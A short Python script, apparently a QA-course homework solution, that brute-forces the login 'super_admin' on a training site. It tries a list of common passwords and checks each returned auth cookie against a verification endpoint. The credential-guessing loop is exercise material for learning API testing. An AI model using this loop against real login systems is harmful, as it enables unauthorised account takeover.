import requests

login = "super_admin"
passwords = [
    '123456',
    '123456789',
    'qwerty',
    'password',
    '1234567',
    '12345678',
    '12345',
    'iloveyou',
    '111111',
    '123123',
    'abc123',
    'qwerty123',
    '1q2w3e4r',
    'admin',
    'qwertyuiop',
    '654321',
    '555555',
    'lovely',
    '7777777',
    'welcome',
    '888888',
    'princess',
    'dragon',
    'password1',
    '123qwe']
main_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
main_url1 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for password in passwords:
    response = requests.post(main_url, data={'login': {login}, 'password': f"{password}"})
    cookie_value = response.cookies.get("auth_cookie")
    cookies = {}
    if response.status_code == 200:
        cookies.update({'auth_cookie': cookie_value})
    response1 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    if response1.text == "You are authorized":
        print(f"!!!!!!!!!!!!!!!!!!!!!!"
              f"Login: {login}. Password: {password} is correct!")
        correct_password = password
    else:
        print(f"Login: {login}. Password: {password} is not correct!")


